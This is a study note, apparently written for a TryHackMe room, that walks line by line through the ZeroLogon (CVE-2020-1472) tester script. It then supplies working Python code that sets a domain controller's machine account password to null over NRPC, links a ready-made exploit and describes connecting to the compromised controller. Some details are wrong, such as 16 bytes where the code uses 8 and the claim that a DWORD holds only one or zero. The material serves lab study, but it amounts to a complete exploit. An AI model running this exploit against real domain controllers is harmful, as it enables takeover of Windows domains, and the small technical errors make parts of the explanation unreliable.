# ZeroLogon PoC
This is a breakdown from [TryHackMe](https://tryhackme.com/room/zer0logon) of the #zerologon exploit, which exploits [[MS-NRPC]] authentication( #MS-NRPC)

The PoC ( #Python) can be found here: https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py

Working Exploit can be found here: https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py ^working-exploit

## **TABLE OF CONTENTS**
- [[ZeroLogon PoC#Breakdown|Breakdown]]
	- [[ZeroLogon PoC#Breakdown#Code Walk-through|Code Walk-through]]
	- [[ZeroLogon PoC#Breakdown#What's it mean|Whats the code mean?]]
- [[ZeroLogon PoC#Crafting Exploit|Crafting Exploit]]


## Breakdown
**REQUIREMENTS**: PoC requires #Impacket

### Code Walk-through
**Lines 3 - 13**
```
1.  from impacket.dcerpc.v5 import nrpc, epm  
2.  from impacket.dcerpc.v5.dtypes import NULL
3.  from impacket.dcerpc.v5 import transport
4.  from impacket import crypto
5.        
6.  import hmac, hashlib, struct, sys, socket, time
7.  from binascii import hexlify, unhexlify
8.  from subprocess import check\_call
9.  MAX\_ATTEMPTS = 2000
```
  

Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we're defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.

  

**Lines 76 - 86**
```
1.  if \_\_name\_\_ == '\_\_main\_\_':     
2.    if not (3 <= len(sys.argv) <= 4):
3.      print('Usage: zerologon\_tester.py <dc-name> <dc-ip>\\n')
4.      print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
5.      print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
6.      sys.exit(1)
7.    else:
8.      \[\_, dc\_name, dc\_ip\] = sys.argv
9.       
10.      dc\_name = dc\_name.rstrip('$')
11.      perform\_attack('\\\\\\\\' + dc\_name, dc\_ip, dc\_name)
```

Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it's exactly 3 (zerologon\_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it's greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc\_name, and dc\_ip. After the arguments are passed, dc\_name is being stripped of the "$" character, as the dc\_name variable shouldn't have it. The user account name should however. Afterwards, it's passing the variables two variables and an additional, modified variable into a module called "perform\_attack".

**Lines 57 - 73**
```
1.  def perform\_attack(dc\_handle, dc\_ip, target\_computer):     
2.      
3.    print('Performing authentication attempts...')
4.    rpc\_con = None
5.    for attempt in range(0, MAX\_ATTEMPTS):  
6.      rpc\_con = try\_zero\_authenticate(dc\_handle, dc\_ip, target\_computer)
7.
8.      if rpc\_con == None:
9.        print('=', end='', flush=True)
10.      else:
11.        break
12.     
13.    if rpc\_con:
14.      print('\\nSuccess! DC can be fully compromised by a Zerologon attack.')
15.    else:
16.      print('\\nAttack failed. Target is probably patched.')
17.      sys.exit(1)
```
  

Line 1 is defining where the variables are being passed into for the local function, \\\\DCNAME is being passed into the dc\_handle variable, dc\_ip is being passed into dc\_ip variable, and dc\_name is being passed into the target\_computer variable. All of which will be used later, or passed into different modules.

  

Line 4 sets the variable rpc\_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it's not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc\_con variable to the output of a different function called "try\_zero\_authenticate" with a couple of variables being passed to it, specifically dc\_handle, dc\_ip, and target\_computer. All of which we addressed earlier. The next lines are simply checking if rpc\_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.

**Lines 20-25**
```
1.  def try\_zero\_authenticate(dc\_handle, dc\_ip, target\_computer):   
2.        
3.    binding = epm.hept\_map(dc\_ip, nrpc.MSRPC\_UUID\_NRPC, protocol='ncacn\_ip\_tcp')
4.    rpc\_con = transport.DCERPCTransportFactory(binding).get\_dce\_rpc()
5.    rpc\_con.connect()
6.    rpc\_con.bind(nrpc.MSRPC\_UUID\_NRPC)
```
  
Line 1 is defining the try\_zero\_authenticate function and is taking the previously mentioned 3 variables as input, and is passing them into the function. Lines 3-6 are establishing a bind and a session with NRPC over TCP/IP so that we can communicate with the domain controller.

**Lines 27-40**
```
1.   plaintext = b'\\x00' \* 8  
2.    ciphertext = b'\\x00' \* 8
3.    
4.    flags = 0x212fffff
5.    
6.    nrpc.hNetrServerReqChallenge(rpc\_con, dc\_handle + '\\x00', target\_computer + '\\x00', plaintext)
7.    try:
8.      server\_auth = nrpc.hNetrServerAuthenticate3(rpc\_con, dc\_handle + '\\x00', target\_computer + '$\\x00', nrpc.NETLOGON\_SECURE\_CHANNEL\_TYPE.ServerSecureChannel,target\_computer + '\\x00', ciphertext, flags)
```
  
Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of "\\x00" which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).


Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the [Microsoft Documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32):
```
1.   NTSTATUS NetrServerReqChallenge(
2.     \[in, unique, string\] LOGONSRV\_HANDLE PrimaryName,
3.     \[in, string\] wchar\_t\* ComputerName,
4.     \[in\] PNETLOGON\_CREDENTIAL ClientChallenge,
5.   );
```
  
The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of "\\x00".

Lines 8 sets up a try except (we'll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for [NetrServerAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9), the following is required: 
```
1.  NTSTATUS NetrServerAuthenticate3(      
2.     \[in, unique, string\] LOGONSRV\_HANDLE PrimaryName,
3.     \[in, string\] wchar\_t\* AccountName,
4.     \[in\] NETLOGON\_SECURE\_CHANNEL\_TYPE SecureChannelType,
5.     \[in, string\] wchar\_t\* ComputerName,
6.     \[in\] PNETLOGON\_CREDENTIAL ClientCredential,
7.     \[in, out\] ULONG \* NegotiateFlags,
8.   );
```
  
On line 9, we supply the DC\_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target\_computer variable as the ComputerName, the Ciphertext (16 bytes of "\\x00" attempting to Abuse Zero Logon, remember there's 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.
```
1.   NTSTATUS NetrServerAuthenticate3(      
2.     \[out\] PNETLOGON\_CREDENTIAL ServerCredential,
3.     \[in, out\] ULONG \* NegotiateFlags,
4.     \[out\] ULONG \* AccountRid
5.   );
```
  
Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.

 **Line 44 - 54**
```
1.   assert server\_auth\['ErrorCode'\] == 0      
2.      return rpc\_con
3.        
4.    except nrpc.DCERPCSessionError as ex:
5.        
6.      if ex.get\_error\_code() == 0xc0000022:
7.        return None
8.      else:
9.        fail(f'Unexpected error code from DC: {ex.get\_error\_code()}.')
10.       
11.    except BaseException as ex:
12.      fail(f'Unexpected error: {ex}.')
```
  

Line 1 is retrieving the Error Code from the Server\_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we're going to return the rpc\_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn't break and exit after receiving an error back.


### What's it mean?
After going back and peaking at Figure 3 on Task 1, or researching how to reset a password over #RDP, you should have came across the following document:

[https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)[](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)

The document outlines what information is required to change a password over NRPC. The following information is required to do so:  
  
```
 NTSTATUS NetrServerPasswordSet2(

   \[in, unique, string\] LOGONSRV\_HANDLE PrimaryName,

   \[in, string\] wchar\_t\* AccountName,

   \[in\] NETLOGON\_SECURE\_CHANNEL\_TYPE SecureChannelType,

   \[in, string\] wchar\_t\* ComputerName,

   \[in\] PNETLOGON\_AUTHENTICATOR Authenticator,

 \[in\] PNL\_TRUST\_PASSWORD ClearNewPassword  

 );  
```
Going back and looking at [NetrServerAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9) and [NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81), we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the [Authenticator](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab) first:
```
 typedef struct \_NETLOGON\_AUTHENTICATOR {

   NETLOGON\_CREDENTIAL Credential;

   DWORD Timestamp;

 }
```
  

And suddenly we've hit another unknown, NETLOGON\_CREDENTIAL. Fortunately, Microsoft does have documentation for [NETLOGON\_CREDENTIAL](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd) as well:
```
 typedef struct \_NETLOGON\_CREDENTIAL {

   CHAR data\[8\];

 } NETLOGON\_CREDENTIAL,

  \*PNETLOGON\_CREDENTIAL;
```
Per the documentation, NETLOGON\_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that "the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation", fortunately we know this value, thanks to Zero Logon, it's 8 bytes of Zero. In terms of the Timestamp, it's a DWORD value, so it can either be a one or a zero. Zero sounds perfectly find to me. 

  

In order to change the password the Microsoft Documentation states that:  
The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes indicting the length of the password, totaling 516 bytes. 

For the simplicity of this room, we can simply supply 516 bytes of all 00 to make a null password. Eventually, we can work towards creating our own custom password, but once again, for simplicity, we're setting it to a null value now.

## Crafting Exploit
Now that we know the required arguments to change the password via #NRPC, we actually have to implement it in Python. We need to take a look at the [nrpc.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py) module within Impacket to see the required structure for how we can craft a netrServerPasswordSet2 Request:  
  
```
def hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob):
    request = NetrServerPasswordSet2()

    request\['PrimaryName'\] = checkNullString(primaryName)

    request\['AccountName'\] = checkNullString(accountName)

    request\['SecureChannelType'\] = secureChannelType

    request\['ComputerName'\] = checkNullString(computerName)

    request\['Authenticator'\] = authenticator

    request\['ClearNewPassword'\] = clearNewPasswordBlob

    return dce.request(request)
```
As expected, most of the field names are the same as what Microsoft provided, except with some differences. Next, we need to know how to structure the Authenticator portion as well:  
  
```
class NETLOGON\_AUTHENTICATOR(NDRSTRUCT):

    structure = (

        ('Credential', NETLOGON\_CREDENTIAL),

        ('Timestamp', DWORD),

    )

```  

The format here is a little bit different compared to the prior, but we'll adjust accordingly when we go to slot it into the PoC, but while we're talking about slotting it into the PoC, where will our added code go?

Our added code will go immediately before "return rpc\_con" on line 45. This is where we know we have successful authentication, we want to grab that before we return to the previous function and terminate the RPC connection. Now that we know all the required information that we'll need to add to the PoC, we'll save you the painstaking effort of writing your own code, and you can use the pre-written code below. The above explanations should help aid in understanding it.  
  

**The Additional Code we're slotting in:**
```
    newPassRequest = nrpc.NetrServerPasswordSet2()

    newPassRequest\['PrimaryName'\] = dc\_handle + '\\x00'

    newPassRequest\['AccountName'\] = target\_computer + '$\\x00'

    newPassRequest\['SecureChannelType'\] = nrpc.NETLOGON\_SECURE\_CHANNEL\_TYPE.ServerSecureChannel

    auth = nrpc.NETLOGON\_AUTHENTICATOR()

    auth\['Credential'\] = b'\\x00' \* 8

    auth\['Timestamp'\] = 0

    newPassRequest\['Authenticator'\] = auth

    newPassRequest\['ComputerName'\] = target\_computer + '\\x00'

    newPassRequest\['ClearNewPassword'\] =  b'\\x00' \* 516

    rpc\_con.request(newPassRequest)
```
At this point, your code should be good to go, and you should be able to successfully exploit Zero Logon. If you are still having issues, you can use the following code found [here](https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py)

## Running Exploit
Using [[ZeroLogon PoC#^working-exploit]], the script requires the **NetBIOS name** of the #DC and its IP address.  
![[zerologon-nullpass_py-help.png]]

After providing the required args, if successful, the script bruteforces the current machine account password and resets the password to the Domain Controller to NULL, specifically 516 byes of \x00. 


![[zerologon-nullpass_py-success.png]]

To connect to the compromised Domain Controller, just use any RPC client, with the NetBIOS name as the user and no password (or enter when prompted) as the password is now set to NULL.


![[rpcclient-connect-zerologon.png]]